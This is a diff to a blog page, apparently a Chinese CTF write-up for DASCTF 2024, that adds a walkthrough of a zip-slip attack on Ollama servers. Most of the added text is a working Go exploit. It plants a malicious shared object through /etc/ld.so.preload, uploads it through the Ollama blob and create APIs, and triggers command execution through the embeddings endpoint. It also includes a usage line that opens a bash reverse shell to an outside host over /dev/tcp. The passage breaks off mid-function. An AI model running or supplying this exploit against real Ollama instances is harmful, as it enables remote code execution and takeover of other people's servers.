@@ -262,7 +262,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.2k字</span>
+        <span class="post-count">2.2k字</span>
       </span>
     </span>
 
@@ -271,7 +271,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">7分</span>
+        <span class="post-count">12分</span>
       </span>
     </span>
     
@@ -448,6 +448,276 @@ HOME_PAGE_HTML <span class="token operator">=</span> <span class="token triple-q
 <p>翻api文档：<a target="_blank" rel="noopener" href="https://github.com/ollama/ollama/blob/main/docs/api.md">https://github.com/ollama/ollama/blob/main/docs/api.md</a></p>
 <p>先拉个镜像下来</p>
 <p><img src="/blog/2024/10/19/DASCTF-2024-%E5%8D%81%E6%9C%88%E8%B5%9B/image-20241019155529069.png" alt="image-20241019155529069"></p>
+<p>思路就是通过zip slip上传 ld.so.preload 到 &#x2F;etc&#x2F;ld.so.preload 用于加载恶意 so，之后随便在官方模型站 pull 一个比较小的模型，最后再使用 &#x2F;api&#x2F;embeddings 接口加载这个模型，加载模型时会调用 ollama 命令开启一个新进程从而加载恶意 so 执行任意命令。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go run main.go <span class="token parameter variable">-target</span> http://127.0.0.1:11434/ <span class="token parameter variable">-exec</span> <span class="token string">"bash -i >&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0>&amp;1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
+
+<span class="token keyword">import</span> <span class="token punctuation">(</span>
+    <span class="token string">"archive/zip"</span>
+    <span class="token string">"bufio"</span>
+    <span class="token string">"bytes"</span>
+    <span class="token string">"crypto/sha256"</span>
+    <span class="token string">"encoding/json"</span>
+    <span class="token string">"flag"</span>
+    <span class="token string">"fmt"</span>
+    <span class="token string">"io"</span>
+    <span class="token string">"log"</span>
+    <span class="token string">"net/http"</span>
+    <span class="token string">"net/url"</span>
+    <span class="token string">"os"</span>
+    <span class="token string">"os/exec"</span>
+    <span class="token string">"strconv"</span>
+    <span class="token string">"strings"</span>
+<span class="token punctuation">)</span>
+
+<span class="token keyword">const</span> CODE <span class="token operator">=</span> <span class="token string">`#include &lt;stdio.h>
+#include &lt;stdlib.h>
+#include &lt;unistd.h>
+
+void __attribute__((constructor)) myInitFunction() &#123;
+    const char *f1 = "/etc/ld.so.preload";
+    const char *f2 = "/tmp/hook.so";
+    unlink(f1);
+    unlink(f2);
+    system("bash -c '%s'");
+&#125;`</span>
+
+<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">var</span> targetUrl <span class="token builtin">string</span>
+    <span class="token keyword">var</span> execCmd <span class="token builtin">string</span>
+    flag<span class="token punctuation">.</span><span class="token function">StringVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>targetUrl<span class="token punctuation">,</span> <span class="token string">"target"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"target url"</span><span class="token punctuation">)</span>
+    flag<span class="token punctuation">.</span><span class="token function">StringVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>execCmd<span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"exec command"</span><span class="token punctuation">)</span>
+    flag<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> targetUrl <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>
+        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"target url is required"</span><span class="token punctuation">)</span>
+        os<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    u <span class="token operator">:=</span> <span class="token function">FormatUrl</span><span class="token punctuation">(</span>targetUrl<span class="token punctuation">)</span>
+
+    detectRes<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">Detect</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span> <span class="token operator">!</span>detectRes <span class="token punctuation">&#123;</span>
+        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"\nVulnerability does not exist"</span><span class="token punctuation">)</span>
+        os<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"\nVulnerability does exist!!!"</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> execCmd <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>
+        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"exec command is required"</span><span class="token punctuation">)</span>
+        os<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> <span class="token function">GenEvilSo</span><span class="token punctuation">(</span>execCmd<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    evilZipName<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">GenEvilZip</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    blobSha256Name<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">UploadBlob</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> evilZipName<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    err <span class="token operator">=</span> <span class="token function">Create</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> strings<span class="token punctuation">.</span><span class="token function">ReplaceAll</span><span class="token punctuation">(</span>blobSha256Name<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    err <span class="token operator">=</span> <span class="token function">EmbeddingsExec</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> <span class="token string">"all-minilm:22m"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">GenEvilSo</span><span class="token punctuation">(</span>cmd <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    code <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span>CODE<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
+    err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"tmp.c"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0644</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+
+    compile <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"gcc"</span><span class="token punctuation">,</span> <span class="token string">"tmp.c"</span><span class="token punctuation">,</span> <span class="token string">"-o"</span><span class="token punctuation">,</span> <span class="token string">"hook.so"</span><span class="token punctuation">,</span> <span class="token string">"-fPIC"</span><span class="token punctuation">,</span> <span class="token string">"-shared"</span><span class="token punctuation">,</span> <span class="token string">"-ldl"</span><span class="token punctuation">,</span> <span class="token string">"-D_GNU_SOURCE"</span><span class="token punctuation">)</span>
+    err <span class="token operator">=</span> compile<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token string">"hook.so"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">GenEvilZip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    zipFile<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token string">"evil.zip"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+    zw <span class="token operator">:=</span> zip<span class="token punctuation">.</span><span class="token function">NewWriter</span><span class="token punctuation">(</span>zipFile<span class="token punctuation">)</span>
+
+    preloadFile<span class="token punctuation">,</span> err <span class="token operator">:=</span> zw<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token string">"../../../../../../../../../../etc/ld.so.preload"</span><span class="token punctuation">)</span>
+    <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> preloadFile<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"/tmp/hook.so"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+    soFile<span class="token punctuation">,</span> err <span class="token operator">:=</span> zw<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token string">"../../../../../../../../../../tmp/hook.so"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+    locSoFile<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"hook.so"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">defer</span> locSoFile<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>soFile<span class="token punctuation">,</span> locSoFile<span class="token punctuation">)</span>
+
+    zw<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    zipFile<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> <span class="token string">"evil.zip"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">UploadBlob</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> fileName <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    f<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">defer</span> f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    h <span class="token operator">:=</span> sha256<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+    fName <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"sha256:%x"</span><span class="token punctuation">,</span> h<span class="token punctuation">.</span><span class="token function">Sum</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">Seek</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+
+    newReader <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
+
+    res<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Post</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/api/blobs/"</span><span class="token operator">+</span>fName<span class="token punctuation">,</span> <span class="token string">"application/octet-stream"</span><span class="token punctuation">,</span> newReader<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+
+    content<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"http log: "</span> <span class="token operator">+</span> <span class="token function">string</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> fName<span class="token punctuation">,</span> <span class="token boolean">nil</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">Create</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> remoteFilePath <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span>
+    jsonContent <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">`&#123;"name": "test","modelfile": "FROM /root/.ollama/models/blobs/%s"&#125;`</span><span class="token punctuation">,</span> remoteFilePath<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    res<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Post</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/api/create"</span><span class="token punctuation">,</span> <span class="token string">"application/json"</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span><span class="token function">NewBuffer</span><span class="token punctuation">(</span>jsonContent<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> err
+    <span class="token punctuation">&#125;</span>
+    content<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> err
+    <span class="token punctuation">&#125;</span>
+    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"http log: "</span> <span class="token operator">+</span> <span class="token function">string</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token boolean">nil</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">EmbeddingsExec</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> model <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>
+        jsonContent <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">`&#123;"model":"%s","keep_alive": 0&#125;`</span><span class="token punctuation">,</span> model<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        res<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Post</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/api/embeddings"</span><span class="token punctuation">,</span> <span class="token string">"application/json"</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span><span class="token function">NewBuffer</span><span class="token punctuation">(</span>jsonContent<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> err
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">if</span> res<span class="token punctuation">.</span>StatusCode <span class="token operator">!=</span> <span class="token number">200</span> <span class="token punctuation">&#123;</span>
+            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"pulling model, please wait......"</span><span class="token punctuation">)</span>
+            err <span class="token operator">:=</span> <span class="token function">PullMinilmModel</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">return</span> err
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            content<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">return</span> err
+            <span class="token punctuation">&#125;</span>
+            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"http log: "</span> <span class="token operator">+</span> <span class="token function">string</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">return</span> <span class="token boolean">nil</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">PullMinilmModel</span><span class="token punctuation">(</span>url <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span>
+    jsonContent <span class="token operator">:=</span> <span class="token string">`&#123;"name":"all-minilm:22m"&#125;`</span>
+    res<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Post</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/api/pull"</span><span class="token punctuation">,</span> <span class="token string">"application/json"</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span><span class="token function">NewBuffer</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>jsonContent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> err
+    <span class="token punctuation">&#125;</span>
+    content<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> err
+    <span class="token punctuation">&#125;</span>
+    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"http log: "</span> <span class="token operator">+</span> <span class="token function">string</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token boolean">nil</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">Detect</span><span class="token punctuation">(</span>url <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/version"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">var</span> jsonMap <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span>
+    jsonContent<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Unmarshal</span><span class="token punctuation">(</span>jsonContent<span class="token punctuation">,</span> <span class="token operator">&amp;</span>jsonMap<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">||</span> jsonMap<span class="token punctuation">[</span><span class="token string">"version"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">,</span> err
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token function">isVersionLessThan</span><span class="token punctuation">(</span>jsonMap<span class="token punctuation">[</span><span class="token string">"version"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"0.1.47"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">FormatUrl</span><span class="token punctuation">(</span>u <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>
+    ur<span class="token punctuation">,</span> err <span class="token operator">:=</span> url<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>ur<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%s://%s"</span><span class="token punctuation">,</span> ur<span class="token punctuation">.</span>Scheme<span class="token punctuation">,</span> ur<span class="token punctuation">.</span>Host<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">isVersionLessThan</span><span class="token punctuation">(</span>version<span class="token punctuation">,</span> target <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>
+    v1 <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Split</span><span class="token punctuation">(</span>version<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span>
+    v2 <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Split</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>
+        num1<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>v1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
